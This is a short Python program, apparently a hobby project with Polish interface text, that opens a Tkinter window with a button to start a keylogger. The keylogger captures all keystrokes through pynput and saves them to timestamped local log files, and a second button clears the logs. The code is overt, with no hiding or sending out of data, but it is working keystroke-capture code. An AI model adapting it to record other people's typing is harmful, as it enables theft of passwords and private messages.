import tkinter as tk
import datetime
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import os

count = 0
keys = []

log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Keylogger_logs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    now = datetime.datetime.now()
    filename = os.path.join(log_dir, now.strftime("%Y-%m-%d_%H-%M-%S.txt"))
    with open(filename, "a") as f:
        for key in keys:
            f.write(str(key))
        f.write("\n")

def clear_logs():
    folder = 'C:\\Users\\mlgdo\\Desktop\\Programming stuff\\Keyloggers\\Keylogger\\Keylogger_logs'
    for file_name in os.listdir(folder):
        file_path = os.path.join(folder, file_name)
        try:
            if os.path.isfile(file_path) and file_path.endswith('.txt'):
                os.remove(file_path)
        except Exception as e:
            print(f"Nie udało się usunąć pliku: {file_path} {e}")


def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    messagebox.showinfo("Keylogger", "Keylogger został zatrzymany")

root = tk.Tk()
root.geometry("300x200")
root.title("Keylogger")

label = tk.Label(root, text="Kliknij przycisk, aby uruchomić keyloggera")
label.pack(pady=20)

button = tk.Button(root, text="Uruchom keyloggera", command=start_keylogger)
button.pack(pady=10)

clear_button = tk.Button(root, text="Wyczyść logi", command=clear_logs)
clear_button.pack(pady=10)

root.mainloop()
